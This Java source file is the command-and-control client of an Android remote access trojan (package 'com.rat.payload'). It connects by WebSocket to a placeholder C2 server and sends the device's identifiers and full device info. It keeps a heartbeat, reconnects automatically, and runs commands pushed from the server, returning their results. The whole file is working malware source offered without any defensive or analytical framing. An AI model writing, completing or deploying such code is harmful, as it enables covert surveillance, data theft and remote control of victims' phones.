package com.rat.payload.network;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.rat.payload.modules.CommandHandler;
import com.rat.payload.modules.DeviceInfo;

import org.json.JSONObject;

import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class C2Client {

    private static final String TAG = "C2Client";
    private static final String C2_HOST = "wss://your-c2-server.com/ws";
    private static final long RECONNECT_DELAY = 5000;
    private static final long HEARTBEAT_INTERVAL = 30000;

    private static C2Client instance;
    private Context context;
    private WebSocket webSocket;
    private OkHttpClient client;
    private Handler heartbeatHandler;
    private Handler reconnectHandler;
    private boolean shouldReconnect = true;
    private CommandHandler commandHandler;

    public C2Client(Context ctx) {
        this.context = ctx.getApplicationContext();
        this.commandHandler = new CommandHandler(ctx);
        this.heartbeatHandler = new Handler(Looper.getMainLooper());
        this.reconnectHandler = new Handler(Looper.getMainLooper());
        this.client = new OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.SECONDS)
            .writeTimeout(10, TimeUnit.SECONDS)
            .pingInterval(HEARTBEAT_INTERVAL, TimeUnit.MILLISECONDS)
            .build();
    }

    public static synchronized C2Client getInstance() {
        return instance;
    }

    public void connect() {
        shouldReconnect = true;
        Request request = new Request.Builder()
            .url(C2_HOST)
            .header("X-Device-ID", DeviceInfo.getDeviceId(context))
            .header("X-Device-Model", DeviceInfo.getModel())
            .build();

        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                Log.i(TAG, "C2 connected");
                sendDeviceInfo();
                startHeartbeat();
            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                handleMessage(text);
            }

            @Override
            public void onClosing(WebSocket webSocket, int code, String reason) {
                Log.w(TAG, "C2 closing: " + reason);
                webSocket.close(code, reason);
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                Log.w(TAG, "C2 closed: " + reason);
                stopHeartbeat();
                scheduleReconnect();
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                Log.e(TAG, "C2 failure: " + t.getMessage());
                stopHeartbeat();
                scheduleReconnect();
            }
        });
        instance = this;
    }

    public void disconnect() {
        shouldReconnect = false;
        stopHeartbeat();
        if (webSocket != null) {
            webSocket.close(1000, "disconnect");
        }
    }

    public void send(JSONObject data) {
        if (webSocket != null) {
            webSocket.send(data.toString());
        }
    }

    private void handleMessage(String text) {
        try {
            JSONObject cmd = new JSONObject(text);
            String action = cmd.optString("action", "");
            JSONObject result = commandHandler.execute(action, cmd);
            if (result != null) {
                result.put("cmd_id", cmd.optString("id", ""));
                send(result);
            }
        } catch (Exception e) {
            Log.e(TAG, "handleMessage error: " + e.getMessage());
        }
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = DeviceInfo.getFullInfo(context);
            info.put("type", "device_info");
            send(info);
        } catch (Exception e) {
            Log.e(TAG, "sendDeviceInfo error: " + e.getMessage());
        }
    }

    private void startHeartbeat() {
        heartbeatHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                try {
                    JSONObject beat = new JSONObject();
                    beat.put("type", "heartbeat");
                    beat.put("timestamp", System.currentTimeMillis());
                    send(beat);
                } catch (Exception e) {
                    Log.e(TAG, "heartbeat error: " + e.getMessage());
                }
                heartbeatHandler.postDelayed(this, HEARTBEAT_INTERVAL);
            }
        }, HEARTBEAT_INTERVAL);
    }

    private void stopHeartbeat() {
        heartbeatHandler.removeCallbacksAndMessages(null);
    }

    private void scheduleReconnect() {
        if (!shouldReconnect) return;
        reconnectHandler.postDelayed(() -> {
            Log.i(TAG, "Reconnecting...");
            connect();
        }, RECONNECT_DELAY);
    }
}
